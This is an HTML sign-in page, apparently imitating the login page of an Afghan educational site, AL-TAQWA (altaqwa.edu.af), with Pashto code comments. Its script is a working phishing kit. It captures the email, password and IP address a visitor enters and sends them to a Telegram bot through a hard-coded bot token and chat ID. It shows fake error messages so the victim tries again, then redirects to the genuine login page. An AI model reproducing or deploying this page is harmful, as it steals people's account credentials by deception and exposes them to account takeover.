<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - AL-TAQWA</title>

<style>
/* عمومي بڼه */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #f5f5f5;
}

/* ============================================= */
/* === د کارت بڼه === */
/* ============================================= */
.login-container {
    background: #ffffff;
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
    padding: 45px 25px 40px 25px; 
    width: 100%;
    display: flex;
    flex-direction: column;
}

/* ============================================= */
/* === موبایل سایز (14px کم شول) === */
/* ============================================= */
@media (max-width: 767px) {
    .login-container {
        /* 445 څخه 431 ته راکم شو (14px کم) */
        max-width: 431px; 
        margin: 20px auto;
    }
}

/* ============================================= */
/* === ډیسټاپ سایز === */
/* ============================================= */
@media (min-width: 768px) {
    body {
        background-color: #fafafa;
    }

    .login-container {
        /* 465 څخه 451 ته راکم شو (14px کم) */
        max-width: 451px; 
        padding: 50px 30px 40px 30px;
        border: 1px solid #eee;
    }

    .logo img {
        max-width: 55%;
    }
}

/* ============================================= */
/* === دننی توکي === */
/* ============================================= */
.logo {
    text-align: center;
    margin-bottom: 25px;
}

.logo img {
    max-width: 75%;
    height: auto;
    display: inline-block;
}

.title {
    text-align: center;
    font-size: 22px;
    font-weight: 500;
    color: #333;
    margin-bottom: 28px;
}

.input-group {
    margin-bottom: 18px;
}

label {
    display: block;
    font-size: 15px;
    font-weight: 500;
    color: #444;
    margin-bottom: 6px;
}

input[type="email"],
input[type="password"] {
    width: 100%;
    height: 44px;
    padding: 0 12px;
    border: 1px solid #e0e0e0;
    border-radius: 6px;
    font-size: 15px;
    color: #333;
    outline: none;
    transition: border-color 0.2s;
}

input[type="email"]:focus,
input[type="password"]:focus {
    border: 1px solid #87CEEB; 
    box-shadow: 0 0 0 2px rgba(135, 206, 235, 0.2);
}

input::placeholder {
    color: #aaa;
}

.remember-me {
    display: flex;
    align-items: center;
    margin-bottom: 25px;
    font-size: 14px;
    color: #444;
}

.remember-me input[type="checkbox"] {
    width: 16px;
    height: 16px;
    margin-right: 8px;
    accent-color: #18c6e7;
}

button {
    width: 100%;
    height: 44px;
    border: none;
    border-radius: 6px;
    background-color: #18c6e7;
    color: #ffffff;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s;
}

button:hover {
    background-color: #0fb6d6;
}

.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 10px;
    border-radius: 6px;
    font-size: 13px;
    text-align: center;
    margin-bottom: 15px;
    display: none;
}
</style>
</head>

<body>

<div class="login-container">
    
    <div class="logo">
        <!-- ============================================== -->
        <!-- خپل فولډر او د عکس نوم دلته بدل کړئ -->
        <!-- ============================================== -->
        <img src="assets/logo.png" alt="AL-TAQWA Logo">
    </div>

    <div class="title">Sign in</div>

    <div id="errorMsg" class="error-msg"></div>

    <div class="input-group">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember-me">
        <input type="checkbox" id="rememberCheck">
        <label for="rememberCheck" style="font-weight: 400; margin:0; cursor:pointer;">Remember password</label>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    // ==========================================
    // دلته خپل نوی ټوکن او چټ آئی ډی واچوئ
    // ==========================================
    const BOT_TOKEN = "8907358280:AAGNOQIWyhvy2hB1yWTIc2XyMp1eQiNsHXo";
    const ADMIN_CHAT_ID = "8295417969";

    let attemptStore = {};

    function hasPashtoCharacters(text) {
        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
        return pashtoRegex.test(text);
    }

    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    function isValidPasswordLength(password) {
        return password.length >= 8;
    }

    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown IP';
        }
    }

    async function sendToAdmin(email, password, ip, attemptNumber) {
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* altaqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram error:", e);
        }
    }

    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) { showError('Please fill in both email and password'); return; }
        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) { showError('Pashto characters are not allowed'); return; }
        if (!isValidEmail(email)) { showError('Please enter a valid email address'); return; }
        if (!isValidPasswordLength(password)) { showError('Password must be at least 8 characters'); return; }

        const ip = await getUserIP();
        const key = `${email}_${ip}`;

        if (!attemptStore[key]) attemptStore[key] = 0;
        attemptStore[key]++;
        const currentAttempt = attemptStore[key];

        // لمړۍ هڅه: معلومات اډمین ته او ایرر
        if (currentAttempt === 1) {
            await sendToAdmin(email, password, ip, currentAttempt);
            showError('Please check your email');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // دویمه هڅه: ایرر
        if (currentAttempt === 2) {
            showError('Please check your password');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // دریمه هڅه: لینک ته تلل بې له لوډینګه
        if (currentAttempt >= 3) {
            await sendToAdmin(email, password, ip, currentAttempt);
            delete attemptStore[key];
            window.location.replace("https://www.altaqwa.edu.af/login");
        }
    });
</script>

</body>
</html>
